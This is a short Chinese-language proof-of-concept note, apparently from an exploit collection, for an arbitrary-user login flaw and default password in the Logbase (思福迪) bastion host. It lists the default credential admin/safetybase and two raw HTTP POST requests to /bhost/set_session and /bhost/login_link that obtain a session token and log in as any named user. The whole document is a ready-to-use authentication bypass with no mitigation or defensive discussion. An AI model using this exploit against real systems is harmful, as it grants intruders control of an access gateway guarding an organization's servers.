# 思福迪堡垒机(Logbase)任意用户登录/默认口令

默认口令：admin/safetybase

poc：

```
POST /bhost/set_session HTTP/1.1
Host: target

u1=admin&m1=

{"result":true,"info":"123123123","ErrMsg":""}

```

获取info字段后带入如下请求的 a0 参数值中,uCode参数值为⽤户名：

```
POST /bhost/login_link HTTP/1.1
Host: xxx.xxx.xxx.xxx
a0=123123123&a1=&a10=2020-01-01+10:10:10&ha=ABCDDDD11JJJAADDDCCC&uCode=admin&vdcode=

```